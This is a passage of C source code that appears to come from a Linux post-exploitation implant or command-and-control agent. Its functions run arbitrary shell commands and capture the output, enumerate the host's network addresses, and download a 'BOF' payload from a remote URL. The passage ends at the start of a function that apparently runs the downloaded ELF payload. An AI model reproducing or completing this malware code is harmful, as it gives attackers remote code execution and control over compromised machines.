char *exec_cmd(const char *cmd, int *out_len)
{
    FILE *fp = popen(cmd, "r");
    if (!fp)
        return NULL;
    char *buffer = malloc(4096);
    if (!buffer)
    {
        pclose(fp);
        return NULL;
    }
    size_t total = 0;
    size_t n;
    while ((n = fread(buffer + total, 1, 4095 - total, fp)) > 0)
    {
        total += n;
        if (total >= 4095)
            break;
    }
    pclose(fp);
    buffer[total] = '\0';
    *out_len = total;
    return buffer;
}

char *get_local_ips()
{
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0)
        return strdup("127.0.0.1");
    struct ifconf ifc;
    char buf[1024];
    ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    if (ioctl(sockfd, SIOCGIFCONF, &ifc) < 0)
    {
        close(sockfd);
        return strdup("127.0.0.1");
    }
    struct ifreq *ifr = ifc.ifc_req;
    int n = ifc.ifc_len / sizeof(struct ifreq);
    char *result = malloc(1024);
    result[0] = '\0';
    for (int i = 0; i < n; i++)
    {
        struct sockaddr_in *addr = (struct sockaddr_in *)&ifr[i].ifr_addr;
        if (addr->sin_family == AF_INET && strcmp(ifr[i].ifr_name, "lo") != 0)
        {
            char ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &addr->sin_addr, ip, INET_ADDRSTRLEN);
            if (strlen(result) > 0)
                strcat(result, ", ");
            strcat(result, ip);
        }
    }
    close(sockfd);
    return strlen(result) > 0 ? result : strdup("127.0.0.1");
}

unsigned char *download_bof(const char *url, size_t *out_size)
{
    char *payload = https_request(url, "GET", NULL);
    if (!payload)
    {
        *out_size = 0;
        return NULL;
    }
    uint64_t realsize;
    memcpy(&realsize, payload - 8, sizeof(realsize));
    *out_size = (size_t)realsize;
    return (unsigned char *)payload;
}

char *run_bof_and_capture(unsigned char *elf_data, uint32_t filesize, char *args, int arglen,
